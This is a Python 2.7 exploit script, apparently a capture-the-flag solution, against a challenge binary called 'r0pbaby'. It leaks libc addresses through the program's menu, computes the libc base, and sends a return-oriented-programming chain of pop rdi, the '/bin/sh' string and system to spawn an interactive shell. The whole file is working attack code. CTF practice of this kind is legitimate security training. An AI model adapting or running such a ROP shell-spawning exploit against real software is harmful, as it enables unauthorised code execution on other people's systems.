#!/usr/bin/env python2.7
# -*- coding:utf-8 -*-
from mkpwn import *

LOCAL = True
DEBUG = True

ELF_BASE = 0x0000555555554000

# B
B_MAIN_RET      = 0xEB3
B_MAIN_MEMCPY   = 0xE4E

# gadget
OFFSET_POP_RDI_RET  = 0x00022b1a

# libc
OFFSET_LIBC_SYSTEM  = 0x0000000000046640
OFFSET_BIN_SH       = 0x17CCDB

# exp
def get_io():
    if LOCAL:
        target  = './r0pbaby_542ee6516410709a1421141501f03760.patched'
    else:
        target  = ('0', 0)

    global io
    io  = mk(target, DEBUG)

def get_libc():
    io.ru(': ')
    io.pr(1)
    io.ru('0x')
    libc_addr = int(io.r(16), 16)
    info_found('libc handle', libc_addr)

def get_symbol(sym):
    io.ru(': ')
    io.pr(2)
    io.ru('symbol')
    io.pr(sym)
    io.ru('0x')
    sym_addr = int(io.r(16), 16)
    info_found(sym, sym_addr)
    return sym_addr

def r0p(length, payload):
    io.ru(': ')
    io.pr(3)
    io.ru('max 1024')
    io.pr(length)
    io.pr(payload)

def exp():
    io.gdb_hint([ELF_BASE + B_MAIN_RET, ELF_BASE + B_MAIN_MEMCPY])
    get_libc()

    libc_system = get_symbol('system')
    libc_base   = libc_system - OFFSET_LIBC_SYSTEM
    pop_rdi_ret = libc_base + OFFSET_POP_RDI_RET
    str_bin_sh  = libc_base + OFFSET_BIN_SH

    payload  = 'A' * 8
    payload += l64(pop_rdi_ret)
    payload += l64(str_bin_sh)
    payload += l64(libc_system)

    r0p(len(payload), payload)
    io.interact()

# main
if __name__ == '__main__':
    get_io()
    exp()
